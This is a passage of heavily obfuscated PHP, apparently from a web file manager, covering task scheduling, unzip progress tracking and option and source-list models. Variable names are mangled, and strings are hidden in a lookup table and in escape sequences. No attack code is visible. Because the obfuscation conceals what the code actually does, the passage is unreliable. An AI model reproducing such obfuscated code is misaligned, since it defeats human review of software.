false; private static $syncTask = false; public static function timeLimit($ÁúàÌ…, $ÏÀíª®å = 5.0) { if (!$ÁúàÌ…) { return; } $şñ­¡ºÚ = Cache::get($ÁúàÌ…); if (!$şñ­¡ºÚ || timeFloat() - floatVal($şñ­¡ºÚ) >= $ÏÀíª®å) { Cache::set($ÁúàÌ…, timeFloat(), $ÏÀíª®å * 10); return !0; } return !1; } public static function timeLimitCall($¿÷ö»›, $‹†£‚ùÂ, $¹Ù—ü»Æ, $‹Æ¶ÆÄª = 5.0) { $÷Ù¥×­ç =& $_SERVER[°‰†òö¯]; if (!$¿÷ö»› || !$‹†£‚ùÂ) { return; } self::$asyncAdd = !0; $ìÅÇ˜Ü¯ = $÷Ù¥×­ç[1879]; $Óı¹õÜ = Cache::get($ìÅÇ˜Ü¯, !0); $µ»Îí = array($÷Ù¥×­ç[1880] => timeFloat(), $÷Ù¥×­ç[1881] => timeFloat(), $÷Ù¥×­ç[343] => $‹†£‚ùÂ, $÷Ù¥×­ç[1871] => $¹Ù—ü»Æ, $÷Ù¥×­ç[206] => $‹Æ¶ÆÄª); if (is_array($Óı¹õÜ[$¿÷ö»›])) { $µ»Îí[$÷Ù¥×­ç[1881]] = $Óı¹õÜ[$¿÷ö»›][$÷Ù¥×­ç[1881]]; } if (is_array($Óı¹õÜ[$¿÷ö»›])) { if (timeFloat() - $Óı¹õÜ[$¿÷ö»›][$÷Ù¥×­ç[1880]] < $µ»Îí[$÷Ù¥×­ç[206]] * 0.3) { return; } $µ»Îí[$÷Ù¥×­ç[1881]] = $Óı¹õÜ[$¿÷ö»›][$÷Ù¥×­ç[1881]]; } $Óı¹õÜ[$¿÷ö»›] = $µ»Îí; Cache::set($ìÅÇ˜Ü¯, $Óı¹õÜ, 60); Cache::removeMemory($ìÅÇ˜Ü¯); write_log($÷Ù¥×­ç[1882] . $¿÷ö»› . $÷Ù¥×­ç[74] . $‹†£‚ùÂ, $÷Ù¥×­ç[197]); } public static function timeLimitCallLoop() { $ƒµ¨ÇĞğ =& $_SERVER[°‰†òö¯]; $ÊóÓóÜÍ = array($ƒµ¨ÇĞğ[1883]); $¥úÃĞ¢© = in_array(strtolower(ACTION), $ÊóÓóÜÍ); if (!$¥úÃĞ¢© && !self::$asyncAdd) { return; } $èŠø×íö = $ƒµ¨ÇĞğ[1879]; $Š¾ùÄŞÁ = Cache::get($èŠø×íö, !0); if (!$Š¾ùÄŞÁ || count($Š¾ùÄŞÁ) <= 0) { return; } $÷‚ŠÉ¨ = !1; $¡ƒöÛêÙ = timeFloat(); $Ëİİ’“¦ = array(); foreach ($Š¾ùÄŞÁ as $ãÌè§ÍÇ => $½ßï£Ş) { if ($¡ƒöÛêÙ - $½ßï£Ş[$ƒµ¨ÇĞğ[1881]] > $½ßï£Ş[$ƒµ¨ÇĞğ[206]]) { $÷‚ŠÉ¨ = !0; try { Hook::apply($½ßï£Ş[$ƒµ¨ÇĞğ[343]], $½ßï£Ş[$ƒµ¨ÇĞğ[1871]]); write_log($ƒµ¨ÇĞğ[1884] . $ãÌè§ÍÇ . $ƒµ¨ÇĞğ[74] . $½ßï£Ş[$ƒµ¨ÇĞğ[343]] . $ƒµ¨ÇĞğ[1885] . ACTION, $ƒµ¨ÇĞğ[197]); } catch (Exception $µ±‚É»·) { } continue; } $Ëİİ’“¦[$ãÌè§ÍÇ] = $½ßï£Ş; } if (!$÷‚ŠÉ¨) { return; } if (!$Ëİİ’“¦) { return Cache::remove($èŠø×íö); } Cache::set($èŠø×íö, $Ëİİ’“¦, 60); Cache::removeMemory($èŠø×íö); } public static function finished($¡éËàÕç, $Ú®€ËÜ–) { $–ï¤È±ï =& $_SERVER[°‰†òö¯]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($–ï¤È±ï[343] => $¡éËàÕç, $–ï¤È±ï[1871] => $Ú®€ËÜ–); } private static function finishedRun() { $°„ôğ =& $_SERVER[°‰†òö¯]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $×óˆ‚ú) { try { Hook::apply($×óˆ‚ú[$°„ôğ[343]], $×óˆ‚ú[$°„ôğ[1871]]); } catch (Exception $üªˆ…›) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $›¨¹Í‹Ú =& $_SERVER[°‰†òö¯]; parent::startAfter(); Hook::bind($›¨¹Í‹Ú[1886], array($this, $›¨¹Í‹Ú[1887])); Hook::bind($›¨¹Í‹Ú[1276], array($this, $›¨¹Í‹Ú[1888])); Hook::bind($›¨¹Í‹Ú[1889], array($this, $›¨¹Í‹Ú[1890])); $„¶ìÉ²ë =& $this->task; $„¶ìÉ²ë[$›¨¹Í‹Ú[1891]] = $›¨¹Í‹Ú[1277]; if (!$„¶ìÉ²ë[$›¨¹Í‹Ú[1659]]) { $„¶ìÉ²ë[$›¨¹Í‹Ú[1659]] = LNG($›¨¹Í‹Ú[1892]); } } protected function endAfter() { $—ŒÏû®’ =& $_SERVER[°‰†òö¯]; parent::endAfter(); Hook::unbind($—ŒÏû®’[1886], array($this, $—ŒÏû®’[1887])); Hook::unbind($—ŒÏû®’[1276], array($this, $—ŒÏû®’[1888])); Hook::unbind($—ŒÏû®’[1889], array($this, $—ŒÏû®’[1890])); } public function updateAfter() { $ğã·¡—Ü =& $_SERVER[°‰†òö¯]; $ç—Ğ©™± =& $this->task; if (!$ç—Ğ©™±[$ğã·¡—Ü[1138]] || !$ç—Ğ©™±[$ğã·¡—Ü[824]]) { if ($ç—Ğ©™±[$ğã·¡—Ü[1891]] != $ğã·¡—Ü[390]) { return; } } if ($ç—Ğ©™±[$ğã·¡—Ü[1891]] == $ğã·¡—Ü[1277]) { $ô¤ôáğ‹ = 0; if ($ç—Ğ©™±[$ğã·¡—Ü[1825]]) { $ô¤ôáğ‹ = $ç—Ğ©™±[$ğã·¡—Ü[1826]] / $ç—Ğ©™±[$ğã·¡—Ü[1825]]; } $ç—Ğ©™±[$ğã·¡—Ü[1773]] = $ô¤ôáğ‹ * 0.3; } else { if ($ç—Ğ©™±[$ğã·¡—Ü[1891]] == $ğã·¡—Ü[390]) { $ô¤ôáğ‹ = $ç—Ğ©™±[$ğã·¡—Ü[1772]] / $ç—Ğ©™±[$ğã·¡—Ü[1138]]; $ç—Ğ©™±[$ğã·¡—Ü[1773]] = 0.3 + $ô¤ôáğ‹ * 0.4; } else { if ($ç—Ğ©™±[$ğã·¡—Ü[1891]] == $ğã·¡—Ü[110]) { $¥ë£ç™• = 0; if ($ç—Ğ©™±[$ğã·¡—Ü[1827]] == $ğã·¡—Ü[110]) { $¥ë£ç™• = $ç—Ğ©™±[$ğã·¡—Ü[1826]]; } $ô¤ôáğ‹ = ($ç—Ğ©™±[$ğã·¡—Ü[1830]] + $¥ë£ç™•) / $ç—Ğ©™±[$ğã·¡—Ü[824]]; $ç—Ğ©™±[$ğã·¡—Ü[1773]] = 0.3 + 0.4 + $ô¤ôáğ‹ * 0.3; } } } if ($ç—Ğ©™±[$ğã·¡—Ü[1773]] > 0) { $®†ë¡„ = timeFloat() - $ç—Ğ©™±[$ğã·¡—Ü[1775]] - $ç—Ğ©™±[$ğã·¡—Ü[1778]]; $ç—Ğ©™±[$ğã·¡—Ü[1779]] = $®†ë¡„ * (1 - $ç—Ğ©™±[$ğã·¡—Ü[1773]]) / $ç—Ğ©™±[$ğã·¡—Ü[1773]]; } } public function addFile($É³±ö) { $Ñ½øéİí =& $_SERVER[°‰†òö¯]; $Ó«•¿Æ¯ =& $this->task; $´»ƒ±Ô = IO::info($É³±ö); $Ó«•¿Æ¯[$Ñ½øéİí[1823]] = $´»ƒ±Ô[$Ñ½øéİí[32]]; $Ó«•¿Æ¯[$Ñ½øéİí[1825]] = $´»ƒ±Ô[$Ñ½øéİí[79]]; $Ó«•¿Æ¯[$Ñ½øéİí[1826]] = 0; $Ó«•¿Æ¯[$Ñ½øéİí[1140]] = $Ñ½øéİí[1846]; $Ó«•¿Æ¯[$Ñ½øéİí[1827]] = $Ñ½øéİí[1277]; $Ó«•¿Æ¯[$Ñ½øéİí[824]] = $´»ƒ±Ô[$Ñ½øéİí[79]]; $Ó«•¿Æ¯[$Ñ½øéİí[1138]] = 1; $øä«Âô = 0; $Ó«•¿Æ¯[$Ñ½øéİí[1834]] = array($Ñ½øéİí[1835] => $øä«Âô + 1, $Ñ½øéİí[496] => $´»ƒ±Ô[$Ñ½øéİí[32]], $Ñ½øéİí[87] => $´»ƒ±Ô[$Ñ½øéİí[87]], $Ñ½øéİí[586] => $´»ƒ±Ô[$Ñ½øéİí[586]] ? $´»ƒ±Ô[$Ñ½øéİí[586]] : $´»ƒ±Ô[$Ñ½øéİí[87]]); $this->update(); } public function zipEvent($ßúË¹¬¬, $Å³Û©µ£, $Ú÷ä¨ª, $ø©¡…¨¼) { $ë”àÏÙ‹ =& $_SERVER[°‰†òö¯]; $Â‹´ØÎ” =& $this->task; $Â‹´ØÎ”[$ë”àÏÙ‹[1823]] = get_path_this($Å³Û©µ£); $Â‹´ØÎ”[$ë”àÏÙ‹[1825]] = $ø©¡…¨¼; $Â‹´ØÎ”[$ë”àÏÙ‹[1826]] = $Ú÷ä¨ª; $Â‹´ØÎ”[$ë”àÏÙ‹[1140]] = $ßúË¹¬¬ == $ë”àÏÙ‹[1893] ? $ë”àÏÙ‹[1894] : $ë”àÏÙ‹[1895]; $Â‹´ØÎ”[$ë”àÏÙ‹[1827]] = $ë”àÏÙ‹[12]; $Â‹´ØÎ”[$ë”àÏÙ‹[824]] = $ø©¡…¨¼; $Â‹´ØÎ”[$ë”àÏÙ‹[1891]] = $ë”àÏÙ‹[390]; $this->update(); } public function unzipAfter($ÇÄÀß§ô) { $»ï„¹÷ğ =& $_SERVER[°‰†òö¯]; $ãš÷ĞØˆ =& $this->task; $ãš÷ĞØˆ[$»ï„¹÷ğ[1891]] = $»ï„¹÷ğ[110]; $µü´Ê°ü = IO::infoWithChildren($ÇÄÀß§ô); $Âç•‘«¸ = 0; $ãš÷ĞØˆ[$»ï„¹÷ğ[1834]] = array($»ï„¹÷ğ[1835] => $Âç•‘«¸ + 1, $»ï„¹÷ğ[496] => $µü´Ê°ü[$»ï„¹÷ğ[32]], $»ï„¹÷ğ[87] => $µü´Ê°ü[$»ï„¹÷ğ[87]], $»ï„¹÷ğ[586] => $µü´Ê°ü[$»ï„¹÷ğ[586]] ? $µü´Ê°ü[$»ï„¹÷ğ[586]] : $µü´Ê°ü[$»ï„¹÷ğ[87]]); if ($µü´Ê°ü[$»ï„¹÷ğ[33]] == $»ï„¹÷ğ[232]) { $ãš÷ĞØˆ[$»ï„¹÷ğ[1138]] = 1; } else { $ãš÷ĞØˆ[$»ï„¹÷ğ[1138]] = $µü´Ê°ü[$»ï„¹÷ğ[82]][$»ï„¹÷ğ[80]]; } $ãš÷ĞØˆ[$»ï„¹÷ğ[1140]] = $»ï„¹÷ğ[12]; $ãš÷ĞØˆ[$»ï„¹÷ğ[1827]] = 0; $ãš÷ĞØˆ[$»ï„¹÷ğ[1772]] = 0; $ãš÷ĞØˆ[$»ï„¹÷ğ[1825]] = 0; $ãš÷ĞØˆ[$»ï„¹÷ğ[1826]] = 0; $ãš÷ĞØˆ[$»ï„¹÷ğ[1823]] = $»ï„¹÷ğ[12]; $ãš÷ĞØˆ[$»ï„¹÷ğ[1830]] = 0; $ãš÷ĞØˆ[$»ï„¹÷ğ[824]] = $µü´Ê°ü[$»ï„¹÷ğ[79]]; $this->update(); self::log($»ï„¹÷ğ[1896] . json_encode(array($ãš÷ĞØˆ, $µü´Ê°ü))); } public function nameParse($üƒ¦Ùçİ) { $Î´¬‰ =& $_SERVER[°‰†òö¯]; $Û¶ó­ş =& $this->task; if ($Û¶ó­ş[$Î´¬‰[1891]] == $Î´¬‰[1277]) { $Û¶ó­ş[$Î´¬‰[1891]] = $Î´¬‰[390]; $Û¶ó­ş[$Î´¬‰[1830]] = 0; $Û¶ó­ş[$Î´¬‰[824]] = 0; } $ÑÅÜ¾øğ = get_path_this($üƒ¦Ùçİ); if (strstr($ÑÅÜ¾øğ, $Î´¬‰[10])) { $Û¶ó­ş[$Î´¬‰[1772]] += 1; $Û¶ó­ş[$Î´¬‰[1138]] += 1; } $Û¶ó­ş[$Î´¬‰[1823]] = $üƒ¦Ùçİ; $this->update(); } } goto CôÕ‘Õ­à; B‹„“œ¾Ìµ: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\155\x4f\160\x74\x69\157\x6e"; public $field = array(); public function listData($Øˆˆ¦ÌÀ = false, $—àáÇÛÙ = "\155\x6f\x64\151\x66\171\x54\x69\x6d\145", $Ó±——âÙ = false) { $§¡½À¨ë = Model($this->modelType)->get(!1, $this->optionType, !0); $¬—ãÛ÷ = array_values($§¡½À¨ë); if ($¬—ãÛ÷ && $¬—ãÛ÷[0] && !is_array($¬—ãÛ÷[0])) { Model($this->modelType)->cacheRemove($this->optionType); $§¡½À¨ë = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$§¡½À¨ë) { return $Øˆˆ¦ÌÀ ? null : array(); } if (!$Øˆˆ¦ÌÀ) { $§¡½À¨ë = array_filter(array_values($§¡½À¨ë)); return array_sort_by($§¡½À¨ë, $—àáÇÛÙ, $Ó±——âÙ); } return $§¡½À¨ë[$_SERVER[°‰†òö¯][474] . $Øˆˆ¦ÌÀ]; } public function insert($êÕô¼Î¥) { $‡Ñí²å¨ =& $_SERVER[°‰†òö¯]; $êÕô¼Î¥ = array_field_key($êÕô¼Î¥, $this->field); $š©ÚÙ¯Å = Model($this->modelType)->get($‡Ñí²å¨[475], $this->optionType . $‡Ñí²å¨[476]); $š©ÚÙ¯Å = $š©ÚÙ¯Å ? $š©ÚÙ¯Å : 0; $êÕô¼Î¥[$‡Ñí²å¨[477]] = ++$š©ÚÙ¯Å; $êÕô¼Î¥[$‡Ñí²å¨[233]] = time(); $êÕô¼Î¥[$‡Ñí²å¨[88]] = time(); Model($this->modelType)->set($‡Ñí²å¨[475], $š©ÚÙ¯Å, $this->optionType . $‡Ñí²å¨[476]); Model($this->modelType)->set($‡Ñí²å¨[474] . $š©ÚÙ¯Å, $êÕô¼Î¥, $this->optionType); return $š©ÚÙ¯Å; } public function update($ğ…Ñæà«, $ßşüá™Š) { $Ìéšúó =& $_SERVER[°‰†òö¯]; $ßşüá™Š = array_field_key($ßşüá™Š, $this->field); $è›´øûª = $this->listData($ğ…Ñæà«); if (!$è›´øûª || !$ğ…Ñæà«) { return !1; } $ßşüá™Š = array_merge($è›´øûª, $ßşüá™Š); $ßşüá™Š[$Ìéšúó[88]] = time(); return Model($this->modelType)->set($Ìéšúó[474] . $ğ…Ñæà«, $ßşüá™Š, $this->optionType); } public function remove($®‚ƒ òš) { if (!$®‚ƒ òš) { return !1; } return Model($this->modelType)->remove($_SERVER[°‰†òö¯][474] . $®‚ƒ òš, $this->optionType); } public function clear() { $³¬Ò¥«² =& $_SERVER[°‰†òö¯]; Model($this->modelType)->remove($³¬Ò¥«²[475], $this->optionType . $³¬Ò¥«²[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($¯Ì…Ü¢ç, $—ÉæíÕå) { if (!$—ÉæíÕå) { return !1; } $ÕºéŸ’¬ = $this->listData(); $ÕºéŸ’¬ = array_to_keyvalue($ÕºéŸ’¬, $¯Ì…Ü¢ç); return isset($ÕºéŸ’¬[$—ÉæíÕå]) ? $ÕºéŸ’¬[$—ÉæíÕå] : !1; } public function findByName($·Šù‚Ê¡) { return $this->findByKey($_SERVER[°‰†òö¯][32], $·Šù‚Ê¡); } protected function resetData($–ÌˆÅÌì) { $Ã€´è–Ë =& $_SERVER[°‰†òö¯]; $–ÌˆÅÌì = is_array($–ÌˆÅÌì) ? $–ÌˆÅÌì : array(); $ß§÷ç»Ê = array(); for ($æû‰•ÖÙ = 0; $æû‰•ÖÙ < count($–ÌˆÅÌì); $æû‰•ÖÙ++) { $ß§÷ç»Ê[$Ã€´è–Ë[474] . $–ÌˆÅÌì[$æû‰•ÖÙ][$Ã€´è–Ë[477]]] = $–ÌˆÅÌì[$æû‰•ÖÙ]; } return Model($this->modelType)->set($ß§÷ç»Ê, !1, $this->optionType); } private function getAutoName($æ×øÓ„Ã) { $Ø¡¸Š§Ù = array_to_keyvalue($this->listData(), $_SERVER[°‰†òö¯][32]); if (!$Ø¡¸Š§Ù || !isset($Ø¡¸Š§Ù[$æ×øÓ„Ã])) { return $æ×øÓ„Ã; } for ($×áêÏ¿Á = 1; $×áêÏ¿Á < count($Ø¡¸Š§Ù); $×áêÏ¿Á++) { $‹ÖŞÈÂĞ = $æ×øÓ„Ã . "\x28{$×áêÏ¿Á}\x29"; if (!isset($Ø¡¸Š§Ù[$‹ÖŞÈÂĞ])) { return $‹ÖŞÈÂĞ; } } return $‹ÖŞÈÂĞ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($”ß‘íÚƒ = false, $ÛÏ¦Ô¼ù = '', $ø¡öúš× = false) { $•¨ıù‚ê =& $_SERVER[°‰†òö¯]; $Ñ±¬•Ã = $this->cacheGet($ÛÏ¦Ô¼ù); $¢¸‹ñ¦í = $this->optionDefault($ÛÏ¦Ô¼ù); $¢¸‹ñ¦í = is_array($¢¸‹ñ¦í) ? $¢¸‹ñ¦í : array(); if (is_array($Ñ±¬•Ã)) { $Ñ±¬•Ã = array_merge($¢¸‹ñ¦í, $Ñ±¬•Ã); return $”ß‘íÚƒ ? isset($Ñ±¬•Ã[$”ß‘íÚƒ]) ? $Ñ±¬•Ã[$”ß‘íÚƒ] : null : $Ñ±¬•Ã; } $æ‹Æ±¾ = $this->filterWhere(array($•¨ıù‚ê[33] => $ÛÏ¦Ô¼ù)); $Ñ±¬•Ã = $this->where($æ‹Æ±¾)->select(); $Ñ±¬•Ã = array_to_keyvalue($Ñ±¬•Ã, $•¨ıù‚ê[97], $•¨ıù‚ê[452]); foreach ($Ñ±¬•Ã as $«®õİÏø => $àìàï€Ô) { if ($ø¡öúš× || in_array($«®õİÏø, $this->jsonField)) { $Ñ±¬•Ã[$«®õİÏø] = json_decode($àìàï€Ô, !0); } } $this->cacheSet($ÛÏ¦Ô¼ù, $Ñ±¬•Ã); $Ñ±¬•Ã = array_merge($¢¸‹ñ¦í, $Ñ±¬•Ã); return $”ß‘íÚƒ ? $Ñ±¬•Ã[$”ß‘íÚƒ] : $Ñ±¬•Ã; } public function set($ÖñÏÃû«, $¾À©ôïû = false, $­­çÕ‘ğ = '') { $ù Ç¤ª¾ =& $_SERVER[°‰†òö¯]; $this->cacheRemove($­­çÕ‘ğ); $¶ —ı¹ = array(); $ª·ú¾î = is_array($ÖñÏÃû«) ? $ÖñÏÃû« : array($ÖñÏÃû« => $¾À©ôïû); foreach ($ª·ú¾î as $¥é³²¯ò => $ÇÔ°õ£Ú) { if (is_array($ÇÔ°õ£Ú)) { $ÇÔ°õ£Ú = json_encode_force($ÇÔ°õ£Ú); } $this->checkLength($ÇÔ°õ£Ú, !1, $this->tableName . $ù Ç¤ª¾[4] . $ÖñÏÃû«); $ÇÔ°õ£Ú = self::textEncode($ÇÔ°õ£Ú); $ª·ú¾î = array($ù Ç¤ª¾[33] => $­­çÕ‘ğ, $ù Ç¤ª¾[97] => $¥é³²¯ò, $ù Ç¤ª¾[452] => $ÇÔ°õ£Ú); $¶ —ı¹[] = $this->filterWhere($ª·ú¾î); } if (!$¶ —ı¹) { return !0; } $¤³‡ã“• = $this->cacheKey($ù Ç¤ª¾[478]); CacheLock::lock($¤³‡ã“•); $´ê·Ö¹ = $this->addAll($¶ —ı¹, array(), !0); CacheLock::unlock($¤³‡ã“•); return $´ê·Ö¹; } protected function optionDefault($Ó×ˆÚî³ = '') { return !1; } public function setDeep($úÊ®ÄÇĞ, $—‹ÈµÉ› = false, $î‰Ã·éÂ = '') { $‘‰»â = explode($_SERVER[°‰†òö¯][10], $úÊ®ÄÇĞ); $Ï×ş¢¿ = $this->get(); array_set_value($Ï×ş¢¿, $úÊ®ÄÇĞ, $—‹ÈµÉ›); $this->set($‘‰»â[0], $Ï×ş¢¿[$‘‰»â[0]], $î‰Ã·éÂ); } public function remove($ò†³ìİä, $¡±‡˜ü“ = '') { $±°”À¶® =& $_SERVER[°‰†òö¯]; $this->cacheRemove($¡±‡˜ü“); $®‹Ç½òæ = $this->filterWhere(array($±°”À¶®[97] => $ò†³ìİä, $±°”À¶®[33] => $¡±‡˜ü“)); if (is_null($ò†³ìİä)) { unset($®‹Ç½òæ[$±°”À¶®[97]]); } return $this->where($®‹Ç½òæ)->delete(); } public function cacheSet($­ù˜€ü, $´°À¿«€ = false) { return Cache::set($this->cacheKey($­ù˜€ü), $´°À¿«€); } public function cacheGet($¹ÜÇÁ¶µ) { return Cache::get($this->cacheKey($¹ÜÇÁ¶µ)); } public function cacheRemove($´ ÓÊº’) { return Cache::remove($this->cacheKey($´ ÓÊº’)); } protected function filterWhere($õƒğ†¥) { return $õƒğ†¥; } protected function cacheKey($ŒÜ„´Ùğ) { return $ŒÜ„´Ùğ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\162\x63\145"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\141\155\x65" => "\x69\x6f\137\163\157\165\162\x63\145\x5f\155\x65\164\x61", "\155\x65\x74\x61\106\x69\145\154\144" => "\x73\157\165\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\x69\x6d\145", "\x74\151\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\165\x6e\143\x74\x69\x6f\x6e"), array("\x63\162\145\141\x74\x65\x54\x69\155\x65", "\164\x69\155\x65", "\151\156\163\x65\x72\x74", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\x76\x69\145\x77\x54\x69\155\x65", "\x74\x69\155\x65", "\x69\156\x73\x65\162\x74", "\x66\x75\x6e\143\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ùô™²¤„) { return $this->listSource(array($_SERVER[°‰†òö¯][479] => $ùô™²¤„)); } public function typeName($ï™¾ö’É) { static $ıŠ¼ÜêÜ = array(self::TYPE_SYSTEM => "\163\171\163\164\x65\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $ıŠ¼ÜêÜ[$ï™¾ö’É . $_SERVER[°‰†òö¯][12]]; } public function sourceListInfo($­­Ğ£Û , $ï´“Ïå¹ = false) { $Å´³¿ó· =& $_SERVER[°‰†òö¯]; $­­Ğ£Û  = $­­Ğ£Û  ? $­­Ğ£Û  : array(); $­­Ğ£Û  = array_filter(array_unique($­­Ğ£Û )); if (!$­­Ğ£Û ) { return array(); } $©üÆø•í = $this->where(array($Å´³¿ó·[193] => array($Å´³¿ó·[7], $­­Ğ£Û )))->select(); $this->_listDataApply($©üÆø•í, $ï´“Ïå¹); return array_to_keyvalue($©üÆø•í, $Å´³¿ó·[193]); } public function pathInfoFilter(&$²İŒş¶©) { $Â½ä³×Ú =& $_SERVER[°‰†òö¯]; static $·ğ‡°Èı = false; static $¿ìÓç± = false; static $¬¹Ó€Î = false; if (!$·ğ‡°Èı) { $ ÂÙû°å = $Â½ä³×Ú[480]; $ ÂÙû°å .= $Â½ä³×Ú[481]; $ ÂÙû°å .= $Â½ä³×Ú[482]; $Î¸²­Ç„ = $Â½ä³×Ú[483]; $ˆßÅ˜ = explode($Â½ä³×Ú[50], $Î¸²­Ç„); $·ğ‡°Èı = explode($Â½ä³×Ú[50], $ ÂÙû°å); $¿ìÓç± = array(); foreach ($·ğ‡°Èı as $ÌõŠÚ´) { if (in_array($ÌõŠÚ´, $ˆßÅ˜)) { continue; } $¿ìÓç±[] = $ÌõŠÚ´; } $¬¹Ó€Î = explode($Â½ä³×Ú[50], $Â½ä³×Ú[484]); } foreach ($¬¹Ó€Î as $¬Íó“ñß) { if (isset($²İŒş¶©[$¬Íó“ñß])) { $²İŒş¶©[$¬Íó“ñß] = intval($²İŒş¶©[$¬Íó“ñß]); } } $²İŒş¶©[$Â½ä³×Ú[87]] = $Â½ä³×Ú[485] . $²İŒş¶©[$Â½ä³×Ú[193]] . $Â½ä³×Ú[486]; $²İŒş¶©[$Â½ä³×Ú[33]] = $²İŒş¶©[$Â½ä³×Ú[487]] == 1 ? $Â½ä³×Ú[78] : $Â½ä³×Ú[232]; $²İŒş¶©[$Â½ä³×Ú[190]] = $this->typeName($²İŒş¶©[$Â½ä³×Ú[190]]); if ($²İŒş¶©[$Â½ä³×Ú[487]] != 1) { $²İŒş¶©[$Â½ä³×Ú[169]] = $²İŒş¶©[$Â½ä³×Ú[488]]; unset($²İŒş¶©[$Â½ä³×Ú[488]]); } $ÅæÏ–· = $·ğ‡°Èı; if (isset($²İŒş¶©[$Â½ä³×Ú[489]]) && $²İŒş¶©[$Â½ä³×Ú[489]][$Â½ä³×Ú[490]] == -1) { $ÅæÏ–· = $¿ìÓç±; } $²İŒş¶© = array_field_key($²İŒş¶©, $ÅæÏ–·); return $²İŒş¶©; } public function listUserFav() { $³‹ÔßÅ› =& $_SERVER[°‰†òö¯]; $üúÈ¤Á = Model($³‹ÔßÅ›[491])->listData(); $«˜—‰Æ½ = array_filter_by_field($üúÈ¤Á, $³‹ÔßÅ›[33], $³‹ÔßÅ›[492]); $«˜—‰Æ½ = array_to_keyvalue($«˜—‰Æ½, $³‹ÔßÅ›[12], $³‹ÔßÅ›[87]); if ($«˜—‰Æ½) { $£­´ˆô = $this->listSource(array($³‹ÔßÅ›[493] => array($³‹ÔßÅ›[494], $«˜—‰Æ½))); } $£­´ˆô = array_to_keyvalue($£­´ˆô[$³‹ÔßÅ›[447]], $³‹ÔßÅ›[193]); foreach ($üúÈ¤Á as &$›«»¡¢ƒ) { $›«»¡¢ƒ = array($³‹ÔßÅ›[495] => $›«»¡¢ƒ[$³‹ÔßÅ›[477]], $³‹ÔßÅ›[496] => $›«»¡¢ƒ[$³‹ÔßÅ›[32]], $³‹ÔßÅ›[497] => $›«»¡¢ƒ[$³‹ÔßÅ›[87]], $³‹ÔßÅ›[498] => $›«»¡¢ƒ[$³‹ÔßÅ›[33]], $³‹ÔßÅ›[499] => $›«»¡¢ƒ[$³‹ÔßÅ›[233]], $³‹ÔßÅ›[500] => $›«»¡¢ƒ[$³‹ÔßÅ›[88]]); if ($›«»¡¢ƒ[$³‹ÔßÅ›[33]] == $³‹ÔßÅ›[492] && $£­´ˆô[$›«»¡¢ƒ[$³‹ÔßÅ›[87]]]) { $›«»¡¢ƒ[$³‹ÔßÅ›[90]] = $£­´ˆô[$›«»¡¢ƒ[$³‹ÔßÅ›[87]]]; } } unset($›«»¡¢ƒ); return $üúÈ¤Á; } public function listUserTag($Â²¦œ™¼) { $¢Œ£²üŸ =& $_SERVER[°‰†òö¯]; if ($Â²¦œ™¼ && !is_array($Â²¦œ™¼)) { $Â²¦œ™¼ = array($Â²¦œ™¼); } $õ‰Ë›ºù = Model($¢Œ£²üŸ[501])->listData(); $ºãÅºÖ = array(); $µìô‘ñ = array(); foreach ($õ‰Ë›ºù as $É¯ÕÔáã) { $µœé¯Å = $É¯ÕÔáã[$¢Œ£²üŸ[87]]; if (!$µœé¯Å) { continue; } if (!isset($µìô‘ñ[$µœé¯Å])) { $µìô‘ñ[$µœé¯Å] = array(); } $µìô‘ñ[$µœé¯Å][] = $É¯ÕÔáã[$¢Œ£²üŸ[502]]; $ºãÅºÖ[$É¯ÕÔáã[$¢Œ£²üŸ[87]]] = $É¯ÕÔáã; } $ëƒ¦ÖÂ = array(); $üáîç… = array(); $Éôìáãğ = array(); foreach ($µìô‘ñ as $‚ùĞîÉö => $‹³™™ÍÜ) { $èğ©ùæ = !0; if (!$Â²¦œ™¼) { $ëƒ¦ÖÂ[] = $‚ùĞîÉö; continue; } foreach ($Â²¦œ™¼ as $ìÏ®Ùî) { if (!in_array($ìÏ®Ùî, $‹³™™ÍÜ)) { $èğ©ùæ = !1; break; } } if (!$èğ©ùæ) { continue; } if (!is_numeric($‚ùĞîÉö)) { $­·©ßƒã = $ºãÅºÖ[$‚ùĞîÉö]; $ç„‡À¿ = array($¢Œ£²üŸ[32] => $­·©ßƒã[$¢Œ£²üŸ[32]], $¢Œ£²üŸ[87] => $­·©ßƒã[$¢Œ£²üŸ[87]], $¢Œ£²üŸ[33] => $­·©ßƒã[$¢Œ£²üŸ[33]], $¢Œ£²üŸ[90] => array($¢Œ£²üŸ[503] => 1), $¢Œ£²üŸ[234] => !0); if ($­·©ßƒã[$¢Œ£²üŸ[33]] == $¢Œ£²üŸ[232]) { $Éôìáãğ[] = $ç„‡À¿; } if ($­·©ßƒã[$¢Œ£²üŸ[33]] == $¢Œ£²üŸ[78]) { $üáîç…[] = $ç„‡À¿; } continue; } $ëƒ¦ÖÂ[] = $‚ùĞîÉö; } if ($ëƒ¦ÖÂ) { $¼ÖøğÈ¼ = $this->listSource(array($¢Œ£²üŸ[493] => array($¢Œ£²üŸ[494], $ëƒ¦ÖÂ))); } $¼ÖøğÈ¼ = $¼ÖøğÈ¼ ? $¼ÖøğÈ¼ : array($¢Œ£²üŸ[85] => array(), $¢Œ£²üŸ[86] => array()); $¼ÖøğÈ¼[$¢Œ£²üŸ[85]] = array_merge($¼ÖøğÈ¼[$¢Œ£²üŸ[85]], $üáîç…); $¼ÖøğÈ¼[$¢Œ£²üŸ[86]] = 